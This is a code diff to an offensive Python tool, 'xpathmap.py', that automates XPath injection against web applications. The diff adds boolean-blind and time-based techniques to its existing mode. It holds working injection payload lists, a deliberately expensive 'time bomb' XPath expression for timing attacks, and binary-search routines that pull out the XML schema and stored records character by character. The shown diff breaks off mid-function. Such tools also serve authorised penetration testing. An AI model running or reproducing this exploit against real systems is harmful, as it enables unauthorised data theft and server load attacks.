@@ -1,19 +1,23 @@
 #!/usr/bin/env python3
 """
 xpathmap.py — Automated XPath Injection & Data Exfiltration Tool
-Reads raw Burp Suite HTTP request files.
+Supports: normal (union/node-selection), boolean-blind, time-based-blind.
 
 Usage:
     python xpathmap.py -r request.txt
     python xpathmap.py -r request.txt -v
+    python xpathmap.py -r request.txt --technique normal
+    python xpathmap.py -r request.txt --technique boolean
+    python xpathmap.py -r request.txt --technique time
     python xpathmap.py -r request.txt --injectable-param q --node-param f --field streetname
     python xpathmap.py -r request.txt --xml output.xml
-    python xpathmap.py -r request.txt --proxy http://127.0.0.1:8080
+    python xpathmap.py -r request.txt --proxy http://127.0.0.1:8080 --threads 10
 """
 
 import argparse
 import difflib
 import re
+import statistics
 import sys
 import time
 import xml.dom.minidom
@@ -29,11 +33,18 @@ import urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+
 # ──────────────────────────────────────────────────────────────────────────────
 # Globals
 # ──────────────────────────────────────────────────────────────────────────────
 
 VERBOSE = False
+CHARSET = (
+    "abcdefghijklmnopqrstuvwxyz"
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    "0123456789"
+    "_-. @!#$%^&*()+=[]{}|;:,<>?/"
+)
 
 
 # ──────────────────────────────────────────────────────────────────────────────
@@ -111,7 +122,6 @@ def parse_burp_request(filepath: str) -> ParsedRequest:
         i += 1
 
     raw_body = "\n".join(lines[i + 1:]).strip() if i < len(lines) else ""
-
     scheme   = "https" if headers.get("Referer", "").startswith("https") else "http"
     full_url = f"{scheme}://{host}{path_and_query}"
 
@@ -133,151 +143,7 @@ def parse_burp_request(filepath: str) -> ParsedRequest:
 
 
 # ──────────────────────────────────────────────────────────────────────────────
-# Response value extractor
-# ──────────────────────────────────────────────────────────────────────────────
-
-class ResponseExtractor:
-    """
-    Figures out how to extract the injected data value from an HTML response.
-
-    Strategy (in order):
-      1. Diff against a known-empty "null baseline" — lines/words that appear
-         only in the data response but not in the baseline are the result.
-      2. Regex patterns commonly used in CTF / lab apps.
-      3. Strip all HTML tags and return plain text (last resort).
-
-    The extractor is calibrated once by calling .calibrate(null_html, data_html, known_value).
-    After calibration it can reliably parse any future response.
-    """
-
-    # Patterns to try if diff fails (ordered by specificity)
-    RESULT_PATTERNS = [
-        # Results block with <br> before value
-        r"<b>Results:</b><br\s*/?><br\s*/?>\s*(.+?)\s*</center>",
-        r"<b>Results?:?</b>\s*<br\s*/?>\s*(.+?)\s*(?:</center>|</div>|</p>)",
-        # Generic: value after last <br> before </center> or </div>
-        r"<br\s*/?>\s*([^<]{1,200}?)\s*</center>",
-        r"<br\s*/?>\s*([^<]{1,200}?)\s*</div>",
-        # Value in a <td> or <span> or <p>
-        r"<td[^>]*>\s*([^<]{1,200}?)\s*</td>",
-        r"<span[^>]*>\s*([^<]{1,200}?)\s*</span>",
-        r"<p[^>]*>\s*([^<]{1,200}?)\s*</p>",
-    ]
-
-    NO_DATA_MARKERS = [
-        "no results", "no result", "not found", "0 results",
-        "nothing found", "empty", "keine ergebnisse",
-    ]
-
-    def __init__(self):
-        self._mode: str = "regex"          # "diff" | "regex" | "strip"
-        self._diff_anchor: str = ""        # stable null-baseline for diffing
-        self._regex: Optional[str] = None  # chosen regex pattern
-        self._null_stripped: str = ""      # stripped text of null response
-
-    def calibrate(self, null_html: str, data_html: str, known_value: str) -> bool:
-        """
-        Try to find extraction method that recovers `known_value` from `data_html`
-        given that `null_html` is the empty/no-data response.
-        Returns True on success.
-        """
-        debug(f"Calibrating extractor (known_value={known_value!r})")
-        self._null_stripped = self._strip_html(null_html)
-
-        # --- Strategy 1: diff ---
-        diff_result = self._diff_extract(null_html, data_html)
-        if diff_result and known_value.strip().lower() in diff_result.strip().lower():
-            self._mode = "diff"
-            self._diff_anchor = null_html
-            success(f"Extractor mode: diff  (found {known_value!r} in diff)")
-            return True
-
-        # --- Strategy 2: regex patterns ---
-        for pattern in self.RESULT_PATTERNS:
-            m = re.search(pattern, data_html, re.IGNORECASE | re.DOTALL)
-            if m:
-                extracted = m.group(1).strip()
-                if known_value.strip().lower() in extracted.lower():
-                    self._mode   = "regex"
-                    self._regex  = pattern
-                    success(f"Extractor mode: regex  pattern={pattern[:60]!r}")
-                    return True
-
-        # --- Strategy 3: plain text diff ---
-        stripped = self._strip_html(data_html)
-        plain_diff = self._text_diff(self._null_stripped, stripped)
-        if known_value.strip().lower() in plain_diff.lower():
-            self._mode = "strip_diff"
-            self._null_stripped = self._strip_html(null_html)
-            success("Extractor mode: stripped-text diff")
-            return True
-
-        warn(f"Could not calibrate extractor for value {known_value!r} — will use best-effort")
-        self._mode = "strip_diff"
-        return False
-
-    def extract(self, html: str) -> Optional[str]:
-        """Extract the data value from an HTML response. Returns None if no data."""
-        if self._is_no_data(html):
-            return None
-
-        if self._mode == "diff":
-            val = self._diff_extract(self._diff_anchor, html)
-        elif self._mode == "regex" and self._regex:
-            m = re.search(self._regex, html, re.IGNORECASE | re.DOTALL)
-            val = m.group(1).strip() if m else None
-        else:
-            # strip_diff or fallback
-            stripped = self._strip_html(html)
-            val = self._text_diff(self._null_stripped, stripped) or None
-
-        if val:
-            val = val.strip()
-            # Sanity: skip if it looks like HTML leaked through
-            if "<" in val and ">" in val:
-                val = self._strip_html(val).strip()
-            return val if val else None
-        return None
-
-    # ── Internals ──────────────────────────────────────────────────────────────
-
-    def _is_no_data(self, html: str) -> bool:
-        low = html.lower()
-        return any(m in low for m in self.NO_DATA_MARKERS)
-
-    @staticmethod
-    def _strip_html(html: str) -> str:
-        """Remove all HTML tags and collapse whitespace."""
-        text = re.sub(r"<[^>]+>", " ", html)
-        text = re.sub(r"\s+", " ", text)
-        return text.strip()
-
-    @staticmethod
-    def _diff_extract(base: str, new: str) -> str:
-        """Return lines/words present in `new` but not in `base`."""
-        base_lines = base.splitlines()
-        new_lines  = new.splitlines()
-        added = []
-        for line in difflib.ndiff(base_lines, new_lines):
-            if line.startswith("+ "):
-                content = line[2:].strip()
-                # Skip lines that are just HTML structure (tags only, no text)
-                text_only = re.sub(r"<[^>]+>", "", content).strip()
-                if text_only:
-                    added.append(text_only)
-        return " ".join(added).strip()
-
-    @staticmethod
-    def _text_diff(base: str, new: str) -> str:
-        """Diff on plain-text level."""
-        base_words = set(base.split())
-        new_words  = new.split()
-        unique = [w for w in new_words if w not in base_words]
-        return " ".join(unique).strip()
-
-
-# ──────────────────────────────────────────────────────────────────────────────
-# HTTP engine
+# HTTP Engine
 # ──────────────────────────────────────────────────────────────────────────────
 
 @dataclass
@@ -294,11 +160,13 @@ class Engine:
             self.session.proxies.update(self.proxies)
         self.session.verify = False
 
-    def send(self, override_params: dict) -> str:
+    def send(self, override_params: dict) -> tuple[str, float]:
+        """Send request, return (response_text, elapsed_seconds)."""
         params = {**self.req.params, **override_params}
         body   = dict(self.req.body_params)
         debug(f"→ {params}")
         try:
+            t0 = time.time()
             if self.req.method == "GET":
                 resp = self.session.get(self.req.url, params=params, timeout=self.timeout)
             else:
@@ -308,19 +176,162 @@ class Engine:
                 resp = self.session.post(
                     self.req.url, params=params, data=body, timeout=self.timeout
                 )
+            elapsed = time.time() - t0
             time.sleep(self.delay)
             text = resp.text.strip()
-            debug(f"← {resp.status_code}  len={len(text)}  {text[:100]!r}")
-            return text
+            debug(f"← {resp.status_code} {elapsed:.3f}s  {text[:80]!r}")
+            return text, elapsed
         except requests.RequestException as e:
             warn(f"Request error: {e}")
-            return ""
+            return "", 0.0
+
+    def send_text(self, override_params: dict) -> str:
+        return self.send(override_params)[0]
 
 
 # ──────────────────────────────────────────────────────────────────────────────
-# Injection detection
+# Injection context — wraps a detected injection point
 # ──────────────────────────────────────────────────────────────────────────────
 
+@dataclass
+class InjectionContext:
+    """
+    Encapsulates everything needed to inject into a specific parameter.
+
+    technique:    "normal" | "boolean" | "time"
+    inj_param:    the parameter we inject into (e.g. "q" or "username")
+    null_payload: payload that makes query return nothing / false
+    true_payload: payload that makes query return something / true  (boolean/time)
+    node_param:   the node-selection parameter (normal mode only, e.g. "f")
+    field_name:   the field name in node_param (normal mode only, e.g. "streetname")
+    true_marker:  string that appears in response when query is TRUE (boolean mode)
+    false_marker: string that appears when query is FALSE (boolean mode)
+    time_threshold: seconds; above = TRUE, below = FALSE (time mode)
+    wrap_prefix:  text before the injected XPath condition
+    wrap_suffix:  text after the injected XPath condition
+    """
+    technique:      str
+    inj_param:      str
+    null_payload:   str
+    true_payload:   str        = ""
+    node_param:     str        = ""
+    field_name:     str        = ""
+    true_marker:    str        = ""
+    false_marker:   str        = ""
+    time_threshold: float      = 0.0
+    wrap_prefix:    str        = "') or ("
+    wrap_suffix:    str        = ") and ('1'='1"
+
+
+# ──────────────────────────────────────────────────────────────────────────────
+# Response value extractor (normal mode)
+# ──────────────────────────────────────────────────────────────────────────────
+
+class ResponseExtractor:
+    RESULT_PATTERNS = [
+        r"<b>Results:</b><br\s*/?><br\s*/?>\s*(.+?)\s*</center>",
+        r"<b>Results?:?</b>\s*<br\s*/?>\s*(.+?)\s*(?:</center>|</div>|</p>)",
+        r"<br\s*/?>\s*([^<]{1,200}?)\s*</center>",
+        r"<br\s*/?>\s*([^<]{1,200}?)\s*</div>",
+        r"<td[^>]*>\s*([^<]{1,200}?)\s*</td>",
+        r"<span[^>]*>\s*([^<]{1,200}?)\s*</span>",
+        r"<p[^>]*>\s*([^<]{1,200}?)\s*</p>",
+    ]
+    NO_DATA_MARKERS = [
+        "no results", "no result", "not found", "nothing found", "0 results",
+    ]
+
+    def __init__(self):
+        self._mode: str = "strip_diff"
+        self._regex: Optional[str] = None
+        self._null_stripped: str = ""
+
+    def calibrate(self, null_html: str, data_html: str, known_value: str) -> bool:
+        self._null_stripped = self._strip_html(null_html)
+        debug(f"Calibrating extractor (known={known_value!r})")
+
+        # Try diff
+        diff_result = self._diff_extract(null_html, data_html)
+        if diff_result and known_value.strip().lower() in diff_result.strip().lower():
+            self._mode = "diff"
+            self._diff_anchor = null_html
+            success(f"Extractor mode: diff")
+            return True
+
+        # Try regex patterns
+        for pattern in self.RESULT_PATTERNS:
+            m = re.search(pattern, data_html, re.IGNORECASE | re.DOTALL)
+            if m:
+                extracted = m.group(1).strip()
+                if known_value.strip().lower() in extracted.lower():
+                    self._mode  = "regex"
+                    self._regex = pattern
+                    success(f"Extractor mode: regex")
+                    return True
+
+        # Strip diff
+        stripped  = self._strip_html(data_html)
+        plain_diff = self._text_diff(self._null_stripped, stripped)
+        if known_value.strip().lower() in plain_diff.lower():
+            self._mode = "strip_diff"
+            success("Extractor mode: strip_diff")
+            return True
+
+        warn("Could not calibrate extractor — best-effort mode")
+        return False
+
+    def extract(self, html: str) -> Optional[str]:
+        if self._is_no_data(html):
+            return None
+        if self._mode == "diff":
+            val = self._diff_extract(self._diff_anchor, html)
+        elif self._mode == "regex" and self._regex:
+            m   = re.search(self._regex, html, re.IGNORECASE | re.DOTALL)
+            val = m.group(1).strip() if m else None
+        else:
+            stripped = self._strip_html(html)
+            val      = self._text_diff(self._null_stripped, stripped) or None
+        if val:
+            val = val.strip()
+            if "<" in val and ">" in val:
+                val = self._strip_html(val).strip()
+            return val if val else None
+        return None
+
+    def _is_no_data(self, html: str) -> bool:
+        low = html.lower()
+        return any(m in low for m in self.NO_DATA_MARKERS)
+
+    @staticmethod
+    def _strip_html(html: str) -> str:
+        text = re.sub(r"<[^>]+>", " ", html)
+        return re.sub(r"\s+", " ", text).strip()
+
+    @staticmethod
+    def _diff_extract(base: str, new: str) -> str:
+        base_lines = base.splitlines()
+        new_lines  = new.splitlines()
+        added = []
+        for line in difflib.ndiff(base_lines, new_lines):
+            if line.startswith("+ "):
+                text_only = re.sub(r"<[^>]+>", "", line[2:]).strip()
+                if text_only:
+                    added.append(text_only)
+        return " ".join(added).strip()
+
+    @staticmethod
+    def _text_diff(base: str, new: str) -> str:
+        base_words = set(base.split())
+        return " ".join(w for w in new.split() if w not in base_words).strip()
+
+
+# ──────────────────────────────────────────────────────────────────────────────
+# TECHNIQUE DETECTION
+# ──────────────────────────────────────────────────────────────────────────────
+
+# ── Payloads ──────────────────────────────────────────────────────────────────
+
+# For normal mode: null/true in node-selection param
 NULL_PAYLOADS = [
     "') and ('1'='2",
     "' and '1'='2",
@@ -334,71 +345,112 @@ TRUE_PAYLOADS = [
     '\") or (\"1\"=\"1',
 ]
 
-NO_DATA_MARKERS = ["no results", "no result", "not found", "nothing found"]
+# For boolean-blind: templates that inject an XPath condition into the predicate
+# {CONDITION} will be replaced with the actual XPath test
+BOOL_TEMPLATES = [
+    # close contains() predicate, inject OR condition
+    ("') or ({CONDITION}) and ('1'='1",  "') and ('1'='2"),
+    # single-quote variant
+    ("' or ({CONDITION}) and '1'='1",    "' and '1'='2"),
+    # close double-quote predicate
+    ('\") or ({CONDITION}) and (\"1\"=\"1', '\") and (\"1\"=\"2'),
+    # bare injection (no closing needed)
+    (" or ({CONDITION}) and 1=1 --",     " and 1=2 --"),
+    # close bracket + inject
+    ("] or [{CONDITION}]//self::*[",     "] and [1=2] //"),
+]
+
+# Exponential count — forces long processing time when condition is TRUE
+TIME_BOMB = "count((//.)[count((//.)[count((//.))>0])])"
 
 
 def _seems_empty(html: str) -> bool:
+    if not html.strip():
+        return True
     low = html.lower()
-    return any(m in low for m in NO_DATA_MARKERS) or not html.strip()
+    return any(m in low for m in ["no results", "no result", "not found",
+                                   "does not exist", "invalid", "0 results"])
 
 
-def _seems_has_data(html: str) -> bool:
+def _seems_data(html: str) -> bool:
     return bool(html.strip()) and not _seems_empty(html)
 
 
-def detect_injectable_param(
+# ── Normal mode detection ─────────────────────────────────────────────────────
+
+def detect_normal(
     engine: Engine,
-    candidates: list[str],
-    node_param: Optional[str] = None,
-    node_field: Optional[str] = None,
-) -> tuple[Optional[str], Optional[str]]:
-    info("Auto-detecting injectable parameter...")
-    baseline = engine.send({})
-    debug(f"Baseline len={len(baseline)}")
+    inj_candidates: list[str],
+    node_candidates: list[str],
+) -> Optional[InjectionContext]:
+    """
+    Detect normal (union/node-selection) injection.
+    Returns InjectionContext or None.
+    """
+    info("  Trying technique: NORMAL (node-selection union)")
 
-    for param in candidates:
+    for param in inj_candidates:
         for null_pay in NULL_PAYLOADS:
-            null_resp = engine.send({param: null_pay})
+            null_html, _ = engine.send({param: null_pay})
             for true_pay in TRUE_PAYLOADS:
-                true_resp = engine.send({param: true_pay})
-                null_empty = _seems_empty(null_resp)
-                true_has   = _seems_has_data(true_resp)
-                debug(f"  {param!r}  null_empty={null_empty}  true_has={true_has}")
+                true_html, _ = engine.send({param: true_pay})
+                null_empty = _seems_empty(null_html)
+                true_data  = _seems_data(true_html)
+                debug(f"    {param!r} null_empty={null_empty} true_data={true_data}")
 
-                if null_empty and true_has:
-                    success(f"Injectable param (boolean): '{param}'  payload={null_pay!r}")
-                    return param, null_pay
+                confirmed = False
+                if null_empty and true_data:
+                    confirmed = True
+                elif null_html != true_html and abs(len(null_html) - len(true_html)) > 10:
+                    if null_empty or len(null_html) < len(true_html):
+                        confirmed = True
 
-                if null_resp != true_resp and abs(len(null_resp) - len(true_resp)) > 10:
-                    if null_empty or len(null_resp) < len(true_resp):
-                        success(f"Injectable param (diff): '{param}'  payload={null_pay!r}")
-                        return param, null_pay
+                if confirmed:
+                    # Find node-selection param
+                    node_p, field = _find_node_param(
+                        engine, param, null_pay,
+                        [p for p in node_candidates if p != param],
+                    )
+                    if node_p:
+                        success(f"  [NORMAL] inj='{param}' node='{node_p}' field='{field}' payload={null_pay!r}")
+                        return InjectionContext(
+                            technique="normal",
+                            inj_param=param,
+                            null_payload=null_pay,
+                            node_param=node_p,
+                            field_name=field,
+                        )
 
-    # Union probe fallback
-    if node_param and node_field:
-        info("Trying union probe fallback...")
-        for param in candidates:
+    # Union probe fallback with known node param
+    for inj_p in inj_candidates:
+        for node_p in [p for p in node_candidates if p != inj_p]:
+            field = engine.req.params.get(node_p) or engine.req.body_params.get(node_p, "")
+            if not field:
+                continue
             for null_pay in NULL_PAYLOADS:
                 for depth in range(2, 6):
                     path  = "".join("/*[1]" for _ in range(depth))
-                    probe = f"{node_field} | {path}"
-                    resp  = engine.send({param: null_pay, node_param: probe})
-                    if _seems_has_data(resp):
-                        success(f"Injectable param (union probe): '{param}'  payload={null_pay!r}")
-                        return param, null_pay
+                    probe = f"{field} | {path}"
+                    resp, _ = engine.send({inj_p: null_pay, node_p: probe})
+                    if _seems_data(resp):
+                        success(f"  [NORMAL] union probe: inj='{inj_p}' node='{node_p}' field='{field}'")
+                        return InjectionContext(
+                            technique="normal",
+                            inj_param=inj_p,
+                            null_payload=null_pay,
+                            node_param=node_p,
+                            field_name=field,
+                        )
+    return None
 
-    return None, None
 
-
-def detect_node_param(
+def _find_node_param(
     engine: Engine,
     inj_param: str,
     null_pay: str,
     candidates: list[str],
-) -> tuple[Optional[str], Optional[str]]:
-    info("Auto-detecting node-selection parameter...")
-    null_baseline = engine.send({inj_param: null_pay})
-
+) -> tuple[Optional[str], str]:
+    null_baseline, _ = engine.send({inj_param: null_pay})
     for param in candidates:
         original = engine.req.params.get(param) or engine.req.body_params.get(param, "")
         if not original:
@@ -406,20 +458,460 @@ def detect_node_param(
         for depth in range(2, 6):
             path  = "".join("/*[1]" for _ in range(depth))
             probe = f"{original} | {path}"
-            resp  = engine.send({inj_param: null_pay, param: probe})
-            if _seems_has_data(resp) and resp != null_baseline:
-                success(f"Node-selection param: '{param}'  field='{original}'")
+            resp, _ = engine.send({inj_param: null_pay, param: probe})
+            if _seems_data(resp) and resp != null_baseline:
                 return param, original
-    return None, None
+    # If single candidate, assume it
+    if len(candidates) == 1:
+        field = engine.req.params.get(candidates[0]) or engine.req.body_params.get(candidates[0], "")
+        return candidates[0], field
+    return None, ""
 
 
-def get_field_from_param(engine: Engine, node_param: str) -> Optional[str]:
-    val = engine.req.params.get(node_param) or engine.req.body_params.get(node_param, "")
-    return val.strip() or None
+# ── Boolean-blind detection ───────────────────────────────────────────────────
+
+def detect_boolean(
+    engine: Engine,
+    inj_candidates: list[str],
+) -> Optional[InjectionContext]:
+    """
+    Detect boolean-blind injection.
+    Looks for parameters where injecting a true condition gives a different
+    response than injecting a false condition.
+    """
+    info("  Trying technique: BOOLEAN-BLIND")
+
+    # A simple condition that is always true / always false in XPath
+    TEST_TRUE  = "1=1"
+    TEST_FALSE = "1=2"
+
+    for param in inj_candidates:
+        baseline, _ = engine.send({})
+        for prefix, null_suffix in BOOL_TEMPLATES:
+            true_pay  = prefix.replace("{CONDITION}", TEST_TRUE)
+            false_pay = prefix.replace("{CONDITION}", TEST_FALSE)
+
+            true_html,  _ = engine.send({param: true_pay})
+            false_html, _ = engine.send({param: false_pay})
+
+            if true_html == false_html:
+                continue
+
+            # Try to figure out which response means "true"
+            # Compare both to baseline
+            true_like_baseline  = _html_similarity(true_html,  baseline) > 0.85
+            false_like_baseline = _html_similarity(false_html, baseline) > 0.85
+
+            debug(
+                f"    {param!r} tpl={prefix[:30]!r} "
+                f"true~base={true_like_baseline} false~base={false_like_baseline}"
+            )
+
+            # True response should differ from false response, and one should
+            # have a success-like marker
+            true_success  = _seems_data(true_html)  or not _seems_empty(true_html)
+            false_success = _seems_data(false_html) or not _seems_empty(false_html)
+
+            if true_success and not false_success:
+                # Find distinguishing markers
+                true_marker, false_marker = _find_bool_markers(true_html, false_html)
+                success(
+                    f"  [BOOLEAN] inj='{param}' "
+                    f"prefix={prefix[:40]!r} "
+                    f"marker='{true_marker[:30]}'"
+                )
+                return InjectionContext(
+                    technique="boolean",
+                    inj_param=param,
+                    null_payload=false_pay,
+                    true_payload=true_pay,
+                    true_marker=true_marker,
+                    false_marker=false_marker,
+                    wrap_prefix=prefix.split("{CONDITION}")[0],
+                    wrap_suffix=prefix.split("{CONDITION}")[1],
+                )
+
+    return None
+
+
+def _html_similarity(a: str, b: str) -> float:
+    """Quick similarity ratio between two HTML strings."""
+    if not a and not b:
+        return 1.0
+    return difflib.SequenceMatcher(None, a[:2000], b[:2000]).ratio()
+
+
+def _find_bool_markers(true_html: str, false_html: str) -> tuple[str, str]:
+    """Extract short distinguishing text snippets from true/false responses."""
+    # Look for text-level differences
+    true_words  = set(re.sub(r"<[^>]+>", " ", true_html).split())
+    false_words = set(re.sub(r"<[^>]+>", " ", false_html).split())
+    only_true   = " ".join(list(true_words  - false_words)[:5])
+    only_false  = " ".join(list(false_words - true_words)[:5])
+    return only_true or "TRUE_RESPONSE", only_false or "FALSE_RESPONSE"
+
+
+# ── Time-based detection ──────────────────────────────────────────────────────
+
+def detect_time_based(
+    engine: Engine,
+    inj_candidates: list[str],
+    samples: int = 5,
+) -> Optional[InjectionContext]:
+    """
+    Detect time-based blind injection.
+    Measures response time with TRUE condition (triggers TIME_BOMB) vs FALSE.
+    """
+    info("  Trying technique: TIME-BASED")
+
+    TEST_TRUE  = "1=1"
+    TEST_FALSE = "1=2"
+
+    for param in inj_candidates:
+        for prefix, _ in BOOL_TEMPLATES:
+            true_pay  = prefix.replace("{CONDITION}", f"{TEST_TRUE} and {TIME_BOMB}>0")
+            false_pay = prefix.replace("{CONDITION}", TEST_FALSE)
+
+            # Collect timing samples
+            true_times:  list[float] = []
+            false_times: list[float] = []
+
+            info(f"    Timing param='{param}' template={prefix[:30]!r} ...")
+            for _ in range(samples):
+                _, t = engine.send({param: true_pay})
+                true_times.append(t)
+            for _ in range(samples):
+                _, t = engine.send({param: false_pay})
+                false_times.append(t)
+
+            avg_true  = statistics.mean(true_times)
+            avg_false = statistics.mean(false_times)
+            debug(f"    avg_true={avg_true:.3f}s  avg_false={avg_false:.3f}s")
+
+            # TRUE responses should be significantly slower
+            if avg_true > avg_false * 2.5 and avg_true > avg_false + 0.3:
+                threshold = (avg_true + avg_false) / 2
+                success(
+                    f"  [TIME-BASED] inj='{param}' "
+                    f"true={avg_true:.2f}s false={avg_false:.2f}s "
+                    f"threshold={threshold:.2f}s"
+                )
+                return InjectionContext(
+                    technique="time",
+                    inj_param=param,
+                    null_payload=false_pay,
+                    true_payload=true_pay,
+                    time_threshold=threshold,
+                    wrap_prefix=prefix.split("{CONDITION}")[0],
+                    wrap_suffix=prefix.split("{CONDITION}")[1],
+                )
+
+    return None
+
+
+# ── Auto-detect: try all techniques in order ──────────────────────────────────
+
+def auto_detect_technique(
+    engine: Engine,
+    all_params: list[str],
+    force_technique: Optional[str] = None,
+) -> Optional[InjectionContext]:
+    """
+    Try techniques in order: normal → boolean → time-based.
+    Return the first that works.
+    """
+    techniques = ["normal", "boolean", "time"] if not force_technique else [force_technique]
+    info(f"Auto-detecting injection technique (order: {' → '.join(techniques)})")
+    print()
+
+    for tech in techniques:
+        ctx = None
+        if tech == "normal":
+            ctx = detect_normal(engine, all_params, all_params)
+        elif tech == "boolean":
+            ctx = detect_boolean(engine, all_params)
+        elif tech == "time":
+            ctx = detect_time_based(engine, all_params)
+
+        if ctx:
+            print()
+            success(f"Confirmed technique: {C.BOLD}{ctx.technique.upper()}{C.RESET}")
+            return ctx
+        print()
+
+    return None
 
 
 # ──────────────────────────────────────────────────────────────────────────────
-# XPath traversal — Node Selection
+# BOOLEAN / TIME ORACLE
+# The single interface for asking true/false questions about the XML document
+# ──────────────────────────────────────────────────────────────────────────────
+
+class Oracle:
+    """
+    Asks a yes/no question via an XPath condition.
+    Works for both boolean-blind and time-based modes.
+    """
+    def __init__(self, engine: Engine, ctx: InjectionContext):
+        self.engine = engine
+        self.ctx    = ctx
+
+    def ask(self, xpath_condition: str) -> bool:
+        """Return True if xpath_condition evaluates to true in the XML doc."""
+        payload = f"{self.ctx.wrap_prefix}{xpath_condition}{self.ctx.wrap_suffix}"
+
+        if self.ctx.technique == "boolean":
+            html, _ = self.engine.send({self.ctx.inj_param: payload})
+            if self.ctx.true_marker and self.ctx.true_marker in html:
+                return True
+            if self.ctx.false_marker and self.ctx.false_marker in html:
+                return False
+            # Fallback: compare to known true/false responses
+            true_html,  _ = self.engine.send({self.ctx.inj_param: self.ctx.true_payload})
+            sim_true  = _html_similarity(html, true_html)
+            return sim_true > 0.8
+
+        elif self.ctx.technique == "time":
+            # Wrap: TRUE condition triggers TIME_BOMB
+            true_pay  = (f"{self.ctx.wrap_prefix}"
+                         f"({xpath_condition}) and {TIME_BOMB}>0"
+                         f"{self.ctx.wrap_suffix}")
+            false_pay = (f"{self.ctx.wrap_prefix}"
+                         f"1=2"
+                         f"{self.ctx.wrap_suffix}")
+            _, t_true  = self.engine.send({self.ctx.inj_param: true_pay})
+            _, t_false = self.engine.send({self.ctx.inj_param: false_pay})
+            debug(f"    oracle time: true={t_true:.3f}s  false={t_false:.3f}s  threshold={self.ctx.time_threshold:.3f}s")
+            return t_true > self.ctx.time_threshold
+
+        return False
+
+
+# ──────────────────────────────────────────────────────────────────────────────
+# BLIND EXFILTRATION ENGINE
+# ──────────────────────────────────────────────────────────────────────────────
+
+class BlindExtractor:
+    """
+    Extracts strings and integers from XML via boolean/time oracle.
+    Uses binary search where possible to minimize requests.
+    """
+    def __init__(self, oracle: Oracle, threads: int = 1):
+        self.oracle  = oracle
+        self.threads = threads
+
+    # ── Integer extraction (binary search) ────────────────────────────────────
+
+    def get_int(self, xpath_expr: str, lo: int = 0, hi: int = 200) -> int:
+        """Binary-search the integer value of an XPath numeric expression."""
+        while lo < hi:
+            mid = (lo + hi) // 2
+            if self.oracle.ask(f"({xpath_expr}) > {mid}"):
+                lo = mid + 1
+            else:
+                hi = mid
+        return lo
+
+    # ── String length ──────────────────────────────────────────────────────────
+
+    def get_length(self, xpath_expr: str) -> int:
+        return self.get_int(f"string-length({xpath_expr})", lo=0, hi=500)
+
+    # ── Single character at position ──────────────────────────────────────────
+
+    def get_char(self, xpath_expr: str, pos: int) -> str:
+        """Binary-search the ASCII code of char at position pos."""
+        code = self.get_int(
+            f"string-to-codepoints(substring({xpath_expr},{pos},1))",
+            lo=0, hi=127,
+        )
+        if code > 0:
+            return chr(code)
+
+        # Fallback: linear search through charset
+        for ch in CHARSET:
+            if self.oracle.ask(f"substring({xpath_expr},{pos},1)='{ch}'"):
+                return ch
+        return "?"
+
+    # ── Full string ───────────────────────────────────────────────────────────
+
+    def get_string(self, xpath_expr: str, known_length: Optional[int] = None) -> str:
+        length = known_length if known_length is not None else self.get_length(xpath_expr)
+        if length == 0:
+            return ""
+
+        result = ["?"] * length
+
+        if self.threads > 1:
+            lock = Lock()
+            def fetch_char(pos):
+                ch = self.get_char(xpath_expr, pos)
+                with lock:
+                    result[pos - 1] = ch
+                    debug(f"    char[{pos}] = {ch!r}")
+                return pos, ch
+
+            with ThreadPoolExecutor(max_workers=self.threads) as ex:
+                futures = {ex.submit(fetch_char, i): i for i in range(1, length + 1)}
+                for f in as_completed(futures):
+                    f.result()
+        else:
+            for pos in range(1, length + 1):
+                ch = self.get_char(xpath_expr, pos)
+                result[pos - 1] = ch
+                debug(f"    char[{pos}] = {ch!r}")
+
+        return "".join(result)
+
+    # ── Count children ────────────────────────────────────────────────────────
+
+    def get_count(self, xpath_expr: str) -> int:
+        return self.get_int(f"count({xpath_expr})", lo=0, hi=100)
+
+
+# ──────────────────────────────────────────────────────────────────────────────
+# BLIND SCHEMA + DATA EXFILTRATION
+# ──────────────────────────────────────────────────────────────────────────────
+
+def blind_exfiltrate_schema(
+    extractor: BlindExtractor,
+    max_depth: int = 5,
+    max_children: int = 20,
+) -> dict:
+    """
+    Exfiltrate the full XML schema using blind oracle.
+    Returns nested dict: {node_name: {child_name: {...} | "leaf"}}
+    """
+    info("Exfiltrating XML schema (blind)...")
+
+    def exfiltrate_node(xpath: str, depth: int) -> dict:
+        if depth > max_depth:
+            return {}
+        n_children = extractor.get_count(f"{xpath}/*")
+        debug(f"  {xpath}  children={n_children}")
+        if n_children == 0:
+            return "leaf"
+
+        children = {}
+        for i in range(1, min(n_children + 1, max_children + 1)):
+            child_xpath = f"{xpath}/*[{i}]"
+            name_len    = extractor.get_length(f"name({child_xpath})")
+            name        = extractor.get_string(f"name({child_xpath})", name_len)
+            info(f"    Schema: {child_xpath} → <{name}>")
+            children[name] = exfiltrate_node(child_xpath, depth + 1)
+        return children
+
+    # Start from root
+    root_len  = extractor.get_length("name(/*[1])")
+    root_name = extractor.get_string("name(/*[1])", root_len)
+    found(f"Root node: <{root_name}>")
+
+    schema = {root_name: exfiltrate_node("/*[1]", 1)}
+    return schema
+
+
+def schema_to_xpaths(schema: dict, prefix: str = "") -> list[str]:
+    """
+    Flatten schema dict into list of XPath leaf expressions.
+    e.g. /users/user[N]/username
+    """
+    paths = []
+
+    def walk(node: dict, path: str):
+        if node == "leaf":
+            paths.append(path)
+            return
+        if isinstance(node, dict):
+            for name, child in node.items():
+                walk(child, f"{path}/{name}")
+
+    for root_name, root_node in schema.items():
+        walk(root_node, f"/{root_name}")
+
+    return paths
+
+
+def blind_exfiltrate_data(
+    extractor: BlindExtractor,
+    schema: dict,
+    max_records: int = 50,
+) -> dict[str, list[dict]]:
+    """
+    Given a schema, extract all data values.
+    Returns {dataset_path: [{field: value, ...}, ...]}
+    """
+    info("Exfiltrating data (blind)...")
+
+    # Find record-level nodes (nodes that repeat, i.e. have siblings)
+    # We look for the deepest non-leaf level with count > 1
+    results: dict[str, list[dict]] = {}
+
+    def find_record_nodes(node: dict, xpath: str):
+        """Find paths to repeating record nodes."""
+        if node == "leaf" or not isinstance(node, dict):
+            return
+
+        for name, child in node.items():
+            child_xpath = f"{xpath}/{name}"
+            if isinstance(child, dict) and all(v == "leaf" for v in child.values()):
+                # This level contains leaf children — it's a record node
+                # Count how many there are
+                n = extractor.get_count(f"{xpath}/{name}[position()>0]/../{name}")
+                if n == 0:
+                    n = extractor.get_count(f"{child_xpath}")
